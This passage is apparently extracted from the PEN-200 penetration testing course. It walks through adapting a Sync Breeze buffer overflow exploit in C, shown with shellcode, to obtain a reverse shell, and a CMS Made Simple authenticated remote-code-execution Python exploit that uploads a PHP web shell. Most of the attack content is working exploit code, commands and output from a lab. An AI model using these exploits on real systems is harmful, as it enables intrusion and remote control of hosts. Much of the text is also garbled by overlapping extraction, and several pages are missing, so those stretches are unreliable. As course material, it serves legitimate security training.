+     "\x55\x5a\xc1\xdc\x1b\x73\xe6\x55\x91\xa5\xc9\x66\x8a\x96\x48"
+     "\xe5\xd1\xca\xaa\xd4\x19\x1f\xab\x11\x47\xd2\xf9\xca\x03\x41"
+     "\xed\x7f\x59\x5a\x86\xcc\x4f\xda\x7b\x84\x6e\xcb\x2a\x9e\x28"
+     "\xcb\xcd\x73\x41\x42\xd5\x90\x6c\x1c\x6e\x62\x1a\x9f\xa6\xba"
+     "\xe3\x0c\x87\x72\x16\x4c\xc0\xb5\xc9\x3b\x38\xc6\x74\x3c\xff"
+     "\xb4\xa2\xc9\x1b\x1e\x20\x69\xc7\x9e\xe5\xec\x8c\xad\x42\x7a"
+     "\xca\xb1\x55\xaf\x61\xcd\xde\x4e\xa5\x47\xa4\x74\x61\x03\x7e"
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                        424
+                                                                                       Penetration Testing with Kali Linux
+
+   "\x14\x30\xe9\xd1\x29\x22\x52\x8d\x8f\x29\x7f\xda\xbd\x70\xe8"
+   "\x2f\x8c\x8a\xe8\x27\x87\xf9\xda\xe8\x33\x95\x56\x60\x9a\x62"
+   "\x98\x5b\x5a\xfc\x67\x64\x9b\xd5\xa3\x30\xcb\x4d\x05\x39\x80"
+   "\x8d\xaa\xec\x07\xdd\x04\x5f\xe8\x8d\xe4\x0f\x80\xc7\xea\x70"
+   "\xb0\xe8\x20\x19\x5b\x13\xa3\xe6\x34\x29\x37\x8f\x46\x4d\x36"
+   "\xf4\xce\xab\x52\x1a\x87\x64\xcb\x83\x82\xfe\x6a\x4b\x19\x7b"
+   "\xac\xc7\xae\x7c\x63\x20\xda\x6e\x14\xc0\x91\xcc\xb3\xdf\x0f"
+   "\x78\x5f\x4d\xd4\x78\x16\x6e\x43\x2f\x7f\x40\x9a\xa5\x6d\xfb"
+   "\x34\xdb\x6f\x9d\x7f\x5f\xb4\x5e\x81\x5e\x39\xda\xa5\x70\x87"
+   "\xe3\xe1\x24\x57\xb2\xbf\x92\x11\x6c\x0e\x4c\xc8\xc3\xd8\x18"
+   "\x8d\x2f\xdb\x5e\x92\x65\xad\xbe\x23\xd0\xe8\xc1\x8c\xb4\xfc"
+   "\xba\xf0\x24\x02\x11\xb1\x45\xe1\xb3\xcc\xed\xbc\x56\x6d\x70"
+   "\x3f\x8d\xb2\x8d\xbc\x27\x4b\x6a\xdc\x42\x4e\x36\x5a\xbf\x22"
+   "\x27\x0f\xbf\x91\x48\x1a";</cr>
+
+     char request_three[] = "&password=A";
+
+       int content_length = 9 + strlen(padding) + strlen(retn) + strlen(shellcode) +
+strlen(request_three);
+
+       char *content_length_string = malloc(15);
+       sprintf(content_length_string, "%d", content_length);
+       int buffer_length = strlen(request_one) + strlen(content_length_string) +
+initial_buffer_size + strlen(retn) + strlen(request_two) + strlen(shellcode) +
+strlen(request_three);
+
+     char *buffer = malloc(buffer_length);
+
+     memset(buffer, 0x00, buffer_length);
+
+     strcpy(buffer, request_one);
+
+     strcat(buffer, content_length_string);
+
+     strcat(buffer, request_two);                                             Whitlow
+     strcat(buffer, padding);
+     strcat(buffer, retn);
+     strcat(buffer, shellcode);
+
+}    sStenrcdaRteq(ubuefsfte(rbu,frfeerqu,esstt_rltehrn(ebe)u;ffer))J;effrey
+int
+     main() {        OS-57752190
+
+     EvilRequest();
+     return 0;
+
+}
+
+     Listing 305 - Exploit code following the socket information, return address instruction, and payload changes
+
+Let's compile the exploit code using mingw-w64 to determine if it generates any errors.
+
+kali@kali:~/Desktop$ <cu>i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -
+lws2_32</cu>
+
+kali@kali:~/Desktop$ <cu>ls -lah</cu>
+total 372K
+drwxr-xr-x 2 kali kali 4.0K Feb 24 17:14 .
+drwxr-xr-x 17 kali kali 4.0K Feb 24 15:42 ..
+-rw-r--r-- 1 kali kali 4.7K Feb 24 15:46 42341.c
+-rwxr-xr-x 1 kali kali 355K Feb 24 17:14 <cr>syncbreeze_exploit.exe</cr>
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                           425
+                                                                                                                              Penetration Testing with Kali Linux
+
+                                    Listing 306 - Compiling the modified exploit code using mingw-64
+
+Now that we have an updated, clean-compiling exploit, we can test it out. We'll return to Immunity
+
+C g Debugger with Sync Breeze attached and press + , follow the JMP ESP address at
+@ 0x10090c83, and press to set a breakpoint on it.
+
+                                      Whitlow
+
+                             Jeffrey
+
+aOtntecme potutroberexaeckpuoteinotuhraesxpbFleiogeuitnrefOr2sSo2-em05t:7SiK7ne5at2ttlihin1.ge90adberbeaukgpgoienrt,awt oeurcJaMnP  ESP address          run  normally  and
+
+                                                                                                                                    let the application
+
+Because this binary is cross compiled to run on Windows, we cannot simply run it from our Kali
+machine. To run this Windows binary, we'll need to use wine, which is a compatibility layer used
+for running Windows applications on several operating systems such as Linux, BSD, and macOS.
+
+kali@kali:~/Desktop$ <cu>sudo wine syncbreeze_exploit.exe</cu>
+
+[>] Initialising Winsock...
+[>] Initialised.
+[>] Socket created.
+[>] Connected
+
+[>] Request sent
+
+                  Listing 307 - Running the Windows exploit using wine
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                426
+                                                                                                                              Penetration Testing with Kali Linux
+
+Surprisingly, we do not hit our breakpoint at all. Instead, the application crashes and the EIP
+register seems to be overwritten by "0x9010090c".
+
+                                                              Whitlow
+
+a1oBrapfy4tfph.bale1iycnr.aao5tthlnyioaeznnibn,Ftygwihgteueebr.C'eilonTl2httnh2heoa1en:tndtwEihcIegPreedoiisntnovhogganavleoetutrfoew(hf0usreOixsterSt1tet-oOo0nf5fro0bfv7esyr97edce50oert2ucfisr1nt8lor9ot3e0htE)owue.IrJvPWnCeeBafrPed(wfu'0Udlrlrrxfeieett9fysoexe0saP1trimnhO0set0iPrnu9recea0ttticdouh)nirifsnafaeddandrieddrsendcstrrtseehrmsepesitasuanborlcuingnyfnafetiedhndrdebtryhsseeeotsnansnectefbkxrtyoottsemesteehtmchetiesotsntaot.ragbceekt
+
+Let's try to understand our offset misalignment. Reviewing the first part of our large padding
+buffer of "A" characters, we'll notice that it starts with a call to malloc with the size 780:
+
+int initial_buffer_size = 780;
+char *padding = malloc(initial_buffer_size);
+
+                                     Listing 308 - Allocating memory for the initial buffer using malloc
+
+This number should seem familiar. In the beginning of this Module, we noted that 780 is the
+offset in bytes required to overwrite the return address on the stack and take control of the EIP
+register.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  427
+                                                                                        Penetration Testing with Kali Linux
+
+The malloc function only allocates a block of memory based on the requested size. This buffer
+needs to be properly initialized, which is done using the memset function right after the call to
+malloc.
+
+memset(padding, 0x41, initial_buffer_size);
+                                           Listing 309 - Filling the initial buffer with "A" characters
+
+Using memset will fill the memory allocation with a particular character, in our case "0x41", the
+hex representation of the "A" character in ASCII.
+
+The next line of code in the exploit is particularly interesting. We find a call to memset, which sets
+the last byte in the allocation to a NULL byte.
+
+memset(padding + initial_buffer_size - 1, <cr>0x00</cr>, 1);
+                  Listing 310 - Memset setting the last byte to a null-terminator to convert the buffer into a string
+
+This may seem confusing at first; however, continuing to read the code, we arrive at the lines
+where the final buffer is created.
+
+char *buffer = malloc(buffer_length);
+
+memset(buffer, 0x00, buffer_length);
+
+strcpy(buffer, request_one);
+
+strcat(buffer, content_length_string);
+
+strcat(buffer, request_two);
+
+strcat(buffer, padding);
+
+strcat(buffer, retn);
+
+strcat(buffer, shellcode);
+
+strcat(buffer, request_three);
+
+The code     starts  wbiythaNlloUcLaLtinbLgyistateinsmg. 3Ne1m1ex-otCr,ryetahbteilnogcctokhdefefoinrfaiWltllhbhsueifttfheblreoufwfobfreutrhfefceehrxapcrlohaitactrearctaerrraayrruasyinbgy  malloc, then
+filling the  array                           varioJuefsfsretrying                                                                                                                           copying the
+
+content  of  the  other  variables  through                               manipulation  functions  such  as                                                                                 strcpy  and
+strcat.
+
+tdtlKahhenneetogeltwuaramsairngtgignebeetytmhtcteehhaetakforieenas0nacxdltu0ebsa0ruen,afdwofrerfetarhnyemeu.nlSsuld-iistzneutecrpObmeSoec-fiton5hcana7eo7tcsne5aatds2rltli1teonsr9ncugt0raacibttntiieygnodsgns,ea(smassiztrercaecahasoninttfi)nrgioganufgostrhtriirsantinhtivtgeifeauroflnyifrpcsi"atmtAidoo"pdncAoisncSrgutsCarubInrIceutch.nfhfTcaeaehsrreaoisscfCttr7aecp8rpNrs0yoU,tgabhLrnyaLadtmsbiessymttt7treiicn7niangg9t
+
+bytes in length. This explains the misaligned overwrite of EIP.
+
+We can quickly fix this misalignment by increasing the requested memory size defined by the
+initial_buffer_size variable by 1.
+
+       <cr>int initial_buffer_size = 781;</cr>
+       char *padding = malloc(initial_buffer_size);
+       memset(padding, 0x41, initial_buffer_size);
+       memset(padding + initial_buffer_size - 1, 0x00, 1);
+
+                                              Listing 312 - Changing the padding allocation size
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                            428
+                                                                                                                            Penetration Testing with Kali Linux
+
+As a final test, we will again compile the code, set up a Netcat listener on port 443 to catch our
+reverse shell, and, after making sure the Sync Breeze service is running on the target machine,
+launch the exploit.
+
+kali@kali:~/Desktop$ <cu>i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -
+lws2_32</cu>
+
+kali@kali:~$ <cu>sudo nc -lvp 443</cu>
+listening on [any] 443 ...
+
+                            Listing 313 - Compiling the exploit and setting up a Netcat listener on port 443
+
+Next, we will run the exploit:
+
+kali@kali:~/Desktop$ <cu>wine syncbreeze_exploit.exe</cu>
+
+[>] Initialising Winsock...
+[>] Initialised.
+[>] Socket created.
+[>] Connected
+
+[>] Request sent
+
+                               Listing 314 - Running the final version of the exploit
+
+Finally, we'll switch to our Netcat listener.
+
+listening on [any] 443 ...
+connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 49662
+Microsoft Windows [Version 10.0.10240]
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> Listing 315 - Receiving a reverse sheWllhointoluorwKali Linux machine
+
+Excellent! We have a shell.    Isninacdedwitieonc,atnhirsuneJxeitpffflorroietmynoKalolin. ger                     requires  access  to  a  Windows-based
+attack platform in the field,
+
+·T1h4is.2LFeixaFWrnixienbignAUgpnpiWtliccaoetviboernsEEtxxhpeplofloOoitSlslio-t5ws7i7n5g21L9e0arning Objectives:
+
+· Troubleshoot Common Web Application Exploit Issues
+
+Web application vulnerabilities do not often result in memory corruption. Since they are not
+affected by protections provided by the operating system such as DEP and ASLR, they are
+significantly easier to re-purpose. However, as we've learned during previous Modules, web
+application vulnerabilities can often lead to database information leaks or even full control of the
+underlying system.
+
+14.2.1 Considerations and Overview
+
+Even if we might not have to deal with hex-encoded payloads in web exploits, it is important to
+properly read the code and understand what considerations must be taken in our editing process.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                   429
+                                                                          Penetration Testing with Kali Linux
+
+When modifying web exploits, there are several key questions we generally need to ask while
+approaching the code:
+
+· Does it initiate an HTTP or HTTPS connection?
+
+· Does it access a specific web application path or route?
+
+· Does the exploit leverage a pre-authentication vulnerability?
+
+· If not, how does the exploit authenticate to the web application?
+
+· How are GET or POST requests crafted to trigger and exploit the vulnerability? Is there any
+      HTTP method involved?
+
+· Does it rely on default application settings (such as the web path of the application) that
+      may have been changed after installation?
+
+· Will oddities such as self-signed certificates disrupt the exploit?
+
+We must also remember that public web application exploits do not consider additional
+protections such as .htaccess files or Web Application Firewalls (WAF). This is mainly because the
+exploit author cannot possibly know about all these protections during the development process,
+making them out of scope.
+
+14.2.2 Selecting the Vulnerability and Fixing the Code
+
+      Info
+     To follow along, we need to start an apache2 server. We can do this by connecting to the
+     lab machine via SSH.
+
+LMexeaptd'soesceSodinmsapipdlaeecrvhetehr2seisofeonrllv2oe.w2r..i5nAgfltisestrceeennninaugrmiooe: nrdauTtirCningPgtphaoenrtwa4se4Wsbh3eiss. tseTlmrhovwieesrn,vtw,ewreseidoidnsicsaocpvopevereararsna  Linux host with an
+                                                                                                                                                                                                       installation of CMS
+                                                                                                                                                                                                       to be vulnerable to
+
+u(OrAaelluttdmihrmmoopauitlneatgen/hclyoHistduUheptiYsoleofaxaavewdduc7alaunp6tewt3iro)aetnhbobewinlsitighatyheennloialsetthphrOipeuacSorbt-psml5giutc7i-va7baee5cluxis2hctp1hiunl9eoese0xintpcdtJailouocevnfraiatitfntirilrtogoaoelbnytoolh,efuewotrehentneaEudsrxmgiespercelvtoor,eaivotrt-.ebiDorteBnad.ipnrvoraeclmiedsosta.eppcloicdaetieoxneccuretidoenn, taianlds
+As we inspect the code, we realize the base_url variable needs to be changed to match our
+
+environment.
+
+base_url = "http://192.168.1.10/cmsms/admin"
+                                       Listing 316 - base_url variable as defined in the original exploit
+
+Let's modify the IP address and the protocol to HTTPS to reflect our Debian VM target:
+
+base_url = <cr>"https://192.168.50.120/admin"</cr>
+                                          Listing 317 - base_url variable updated to match our case
+
+We also notice that, while browsing the target website, we're presented with a
+SEC_ERROR_UNKNOWN_ISSUER error. This error indicates that the certificate on the remote host
+cannot be validated. We'll need to account for this in the exploit code.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                               430
+                                                                                                                                              Penetration Testing with Kali Linux
+
+Specifically, the exploit is using the requests Python library to communicate with the target. The
+code makes three POST requests on lines 34, 55, and 80:
+
+...
+       response = requests.post(url, data=data, allow_redirects=False)
+
+...
+       response = requests.post(url, data=data, files=txt, cookies=cookies)
+
+...
+       response = requests.post(url, data=data, cookies=cookies, allow_redirects=False)
+
+...
+                                   Listing 318 - All three post requests as defined in the original exploit
+
+Moreover, the official documentation indicates that the SSL certificate will be ignored if we set the
+verify parameter to "False".
+
+...
+       response = requests.post(url, data=data, allow_redirects=False,
+
+<cr>verify=False</cr>)
+...
+
+       response = requests.post(url, data=data, files=txt, cookies=cookies,
+<cr>verify=False</cr>)
+...
+
+       response = requests.post(url, data=data, cookies=cookies, allow_redirects=False,
+<cr>verify=False</cr>)
+...
+
+                                      Listing 319 - Modified post requests to ignore SSL verification.
+
+Finally, we also need to change the credentials used in the original exploit to match those found
+
+during the enumeration process. These are defined in the username and password variables at
+lupWinaseesersscwna1aon5rmedeaan==sdil""1ypa6rdae,smrpiseLlnwasis"ocptirenedgct"ht3i2ev0es-leyu.csererndaemnetiaanlds.passwJeofrdfvraeryiabWlehsitalsodwefined in the original exploit
+upInsaestrshnwisaomrdeca==se"", <<wccrre>>LHaidsUdotYminfignan3ow<2/7t16cn-r3ue<>se"/edcrOnrSa>-tmo"5e77ua5np2dd1pa9at0seswtohred
+                                                                                                                                   variables  updated to match our scenario             system
+
+                                                                                                                                   simple      payload since it only executes
+
+commands passed in clear text within the GET request.
+
+After all edits are complete, the final exploit should appear as follows:
+
+# Exploit Title: CMS Made Simple 2.2.5 authenticated Remote Code Execution
+# Date: 3rd of July, 2018
+# Exploit Author: Mustafa Hasan (@strukt93)
+# Vendor Homepage: http://www.cmsmadesimple.org/
+# Software Link: http://www.cmsmadesimple.org/downloads/cmsms/
+# Version: 2.2.5
+# CVE: CVE-2018-1000094
+
+import requests
+import base64
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                431
+                                                                          Penetration Testing with Kali Linux
+
+       page = "/moduleinterface.php"
+       url = base_url + page
+       b64 = base64.b64encode(txt_filename)
+       serialized = 'a:1:{{i:0;s:{}:"{}";}}'.format(len(b64), b64)
+       data = {
+
+              "mact": mact,
+              csrf_param: csrf_token,
+              "m1_fileactioncopy": "",
+              "m1_path": upload_dir,
+              "m1_selall": serialized,
+              "m1_destdir": "/",
+              "m1_destname": php_filename,
+              "m1_submit": "Copy"
+       }
+       print "[*] Attempting to copy {} to {}...".format(txt_filename, php_filename)
+       <cr>response = requests.post(url, data=data, cookies=cookies,
+allow_redirects=False, verify=False)</cr>
+       status_code = response.status_code
+       if status_code == 302:
+              if response.headers['Location'].endswith('copysuccess'):
+
+                     print "[+] File copied successfully"
+                     return True
+       print "[-] An error occurred while copying, maybe {} already
+exists".format(php_filename)
+       return None
+
+def quit():
+       print "[-] Exploit failed"
+       exit()
+
+def run():                                  Whitlow
+       cookies,csrf_token = authenticate()
+       if not cookies:
+
+pruhnp(_piif)rffiilnnneqqqootnuuuttaiii"mtttcu[e(((+po))))]lpyo_Eatdx_pol_tpoxthip(tc(scoooukcocikeieOeesS,ds-e,5cd77c,s5rs2fsr1_hf9t_e0tololkJekecnefna)f:)nr:ebye found at: {}".format(upload_url + '/' +
+
+Listing 322 - Modified exploit containing the required changes for our case
+
+Running the exploit generates an unexpected error.
+
+kali@kali:~$ <cu>python2 44976_modified.py</cu>
+/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:849:
+InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate
+verification is strongly advised. See:
+https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
+
+   InsecureRequestWarning)
+[+] Authenticated successfully with the supplied credentials
+Traceback (most recent call last):
+
+   File "44976_modified.py", line 103, in <module>
+       run()
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.              433
+                                                                          Penetration Testing with Kali Linux
+
+https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
+   InsecureRequestWarning)
+
+[+] Authenticated successfully with the supplied credentials
+[+] String that is being split: https://192.168.50.45/admin?_sk_=bdc51a781fe6edcc126
+[*] Attempting to upload cmsmsrce.txt...
+...
+[+] Successfully uploaded cmsmsrce.txt
+[*] Attempting to copy cmsmsrce.txt to shell.php...
+...
+[+] File copied successfully
+<cr>[+] Exploit succeeded, shell can be found at:
+https://192.168.50.45/uploads/shell.php</cr>
+
+                                                   Listing 329 - Successful exploitation output
+
+The error is no longer displayed, and we are presented with a message informing us that the
+exploit has succeeded. Although we don't clearly understand why we needed to change the
+csrf_param variable, this scenario showed us how to adapt to unexpected situations, something
+great penetration testers do very well.
+
+We can now validate the exploit by attaching to the PHP shell with a tool like curl and supplying a
+system command to serve as the payload:
+
+kali@kali:~$ <cu>curl -k https://192.168.50.45/uploads/shell.php?cmd=whoami</cu>
+<cr>www-data</cr>
+
+         Listing 330 - Verifying if our exploit was successful by trying to execute whoami using the uploaded php shell
+
+Nice! The exploit was successful, and we now have a web shell.
+
+14.3     Wrapping Up         the  main  segments  oWhf iatlopwlain        stack-based  buffer                                                                                                    overflow  that
+
+In this  Module, we covered
+roerqdueirretodmexatkeensitivrueneodnitiongurtKoamli aattctahcokuprlatatfrogJreemftf.ernevyironment. We then cross-compiled the code in
+
+eTfWoxhrepealsaoedlistisofsfcdemeurenroniandtrgiiftoiaaesrdngreeaetnvwegenaaevlgbiesreomoxnlupemtlnoieotOi.tnnStst-.o5t7do7e5cm2o1om9n0mstoranteobhsotwactlheesseentcyopuensteorfeedxpwlohietsn  can be re-purposed
+                                                                                                                                                                                                 dealing with public
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                   436
+--- [NOTE: pages 432, 434, 435 of the original PDF could not be extracted due to a persistent local file-write interference issue. This covers pages 413-431, 433, and 436 of the 24-page chapter (~88% coverage). The missing pages fall within section 14.2.3 'Troubleshooting the index out of range Error' -- some mid-walkthrough debugging detail may be missing, but the section's start and the chapter's 14.3 Wrapping Up are both present.] ---
